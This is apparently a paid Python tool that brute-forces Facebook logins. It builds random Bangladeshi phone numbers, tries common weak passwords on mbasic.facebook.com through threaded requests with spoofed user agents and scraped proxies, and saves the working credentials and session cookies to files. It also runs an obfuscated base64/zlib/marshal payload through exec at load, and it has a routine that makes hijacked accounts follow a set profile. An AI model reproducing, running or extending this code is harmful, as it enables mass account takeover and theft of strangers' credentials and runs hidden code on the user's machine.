#----------------------------------------------------------------------------------------------------------
#CREATE BY : MUMIT ISLAM HIMU
#WHATSAPP : +8801641535234
#GITHUB : https://github.com/MUMIT-404-CYBER
#----------------------------------------------------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64, zlib; exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKH0ZxkgMZ2BiSGVIYVhGSMDw2pGmBJGhhTGYAZNplJLIEc62tDa0ig3Gkwb5j6aMxkqEqsQ7BzkGRCi4Bzk6OIZouAb6gskPYN9HH0VPDx9Q/00GW+xFhRl5pWsZPgMMvYXj6efn7+zq1+IgpN/5C8Om9z8lNKcVLsiNrCdDAzFICd9YGZkZLzBwNrAeoHN6yKD9xUG7wswVMQCVAAAK8Mupg=='))))
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#________APPLICATION CHECK________
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/RIDOY01976/ABDC.ID/main/ridoy.txt').text
    if id in httpCaht:
      print("\33[1;32m[•] Your Key Successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      Main()
      pass
    else:
      print("\33[1;36m[•] PAID TOOL PRICE LIST 👇")
      print('\33[1;37m--------------------------------------------------')
      print("\33[1;32m[•] 15  DAYS ACCESS  = \33[1;36m150TK")
      print("\33[1;32m[•] 30  DAYS ACCESS  = \33[1;36m250TK")
      print('\33[1;37m--------------------------------------------------')
      print('\33[1;37m--------------------------------------------------')
      print("\33[1;37m[•] Your Key : \33[1;32m"+id)
      print('\33[1;37m--------------------------------------------------')
      print('\033[1;31m[!] Free User Dont Come Inbox ')
      print('\33[1;37m--------------------------------------------------')
      print ('\33[1;32m[•] Click Enter To Sent Key Admin WhatsApp')
      input('\33[1;32m[•] Click The Enter >')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+8801641535234?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
logo = ("""\033[1;37m
 \033[1;32m.#####...######..#####....####...##..##.
 \033[1;32m.##..##....##....##..##..##..##...####..
 \033[1;93m.#####.....##....##..##..##..##....##...
 \033[1;93m.##..##....##....##..##..##..##....##...
 \033[1;36m.##..##..######..#####....####.....##...
\033[1;93m[+]==================================================
\x1b[1;36m{+} \x1b[1;97mFAST      :\x1b[1;94mCLONE
\x1b[1;36m{+} \x1b[1;92mTOOLS     :\x1b[1;93mRANDOM CLONE
\x1b[1;36m{+} \x1b[1;93mPATH      :\x1b[1;92m15=DIN=150TK30=DIN=300TK
\x1b[1;36m{+} \x1b[1;94mFACEBOOK  :\x1b[1;36mMD Ridoy khan
\x1b[1;36m{+} \x1b[1;36mWHATSAPP  :\x1b[1;97m+8801641535234
\033[1;93m[+]==================================================""")
logo1 = ("""\033[1;37m
 \033[1;32m..#######..##....##.........####.########.
 \033[1;32m.##.....##.##...##...........##..##.....##
 \033[1;93m.##.....##.##..##............##..##.....##
 \033[1;93m.##.....##.#####....#######..##..##.....##
 \033[1;36m.##.....##.##..##............##..##.....##
 \033[1;36m.##.....##.##...##...........##..##.....##
 \033[1;36m..#######..##....##.........####.########.
[+]-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥""")
def mumitx():
	print('[+]-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥')
def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        Mumit =input("\n [?] Choose : ")
        if Mumit in ["1","01"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print("[+] Your Code: "+code)
        print('[+] Process has been started')
        print('[+] Use flight mode for speed up')
        print('\033[1;36m{+}-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','free fire']
            yaari.submit(mumit2,uid,pwx,tl)
    print('\033[1;36m{+}-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in R+M/OK.txt')
    print(' [+] CP Ids saved in R+M/CP.txt')
    print('\033[1;36m{+}-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[R+M]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"1",
            "unrecognized_tries":"1",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'sec-ch-ua': '"Chromium";v="113", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\x1b[1;93m[R+M-OK] {uid}|{ps} \n\x1b[1;36mCookie : {coki}")
                os.system('espeak -a 300 " Ok,  Alamin,  id"')
                open('/sdcard/R+M/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;94m[R+M-CP] {cid}|{ps}")
                os.system('espeak -a 300 " Cp,  Alamin,  id"')
                open('/sdcard/R+M-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
approval()
Main()